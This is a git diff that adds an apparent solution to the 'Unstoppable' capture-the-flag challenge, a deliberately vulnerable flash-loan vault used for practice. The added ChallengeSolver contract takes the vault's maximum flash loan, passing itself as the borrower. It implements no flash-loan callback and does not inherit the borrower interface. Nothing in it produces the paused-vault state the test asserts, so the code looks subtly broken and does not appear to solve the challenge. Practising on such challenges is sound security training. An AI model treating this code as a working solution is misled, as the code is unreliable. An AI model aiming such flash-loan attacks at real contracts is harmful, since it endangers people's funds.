@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        ChallengeSolver solver = new ChallengeSolver(token, vault, monitorContract);
+        solver.run();
     }
 
     /**
@@ -107,5 +108,22 @@ contract UnstoppableChallenge is Test {
         // And now the monitor paused the vault and transferred ownership to deployer
         assertTrue(vault.paused(), "Vault is not paused");
         assertEq(vault.owner(), deployer, "Vault did not change owner");
+    }
+}
+
+contract ChallengeSolver {
+    DamnValuableToken token;
+    UnstoppableVault vault;
+    UnstoppableMonitor monitor;
+
+    constructor(DamnValuableToken _token, UnstoppableVault _vault, UnstoppableMonitor _monitor) {
+        token = _token;
+        vault = _vault;
+        monitor = _monitor;
+    }
+
+    function run() public {
+        uint256 loanAmount = vault.maxFlashLoan(address(token));
+        vault.flashLoan(this, address(token), loanAmount, "");
     }
 }
